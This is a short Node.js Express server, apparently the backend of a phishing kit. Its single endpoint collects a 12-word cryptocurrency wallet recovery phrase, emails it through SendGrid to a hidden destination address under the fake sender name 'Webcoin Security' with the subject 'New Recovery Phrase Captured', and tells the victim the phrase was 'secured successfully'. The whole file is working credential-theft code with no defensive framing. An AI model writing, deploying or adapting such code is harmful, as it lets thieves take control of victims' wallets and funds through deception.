const express = require("express");
const cors = require("cors");
const sgMail = require("@sendgrid/mail");
require("dotenv").config();

const app = express();
app.use(cors());
app.use(express.json());

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

app.post("/api/send-phrase", async (req, res) => {
  const { words } = req.body;

  if (!words || words.length !== 12) {
    return res.status(400).json({ message: "Invalid phrase" });
  }

  const msg = {
    to: process.env.DEST_EMAIL,
    from: {
      email: process.env.FROM_EMAIL,
      name: "Webcoin Security"
    },
    subject: "New Recovery Phrase Captured",
    text: `Phrase: ${words.join(" ")}`,
  };

  try {
    await sgMail.send(msg);
    return res.json({ message: " secured successfully!" });
  } catch (error) {
    console.log("SENDGRID ERROR:", error.response?.body?.errors || error);
    return res.status(500).json({ error: "secure failed" });
  }
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on ${PORT}`));
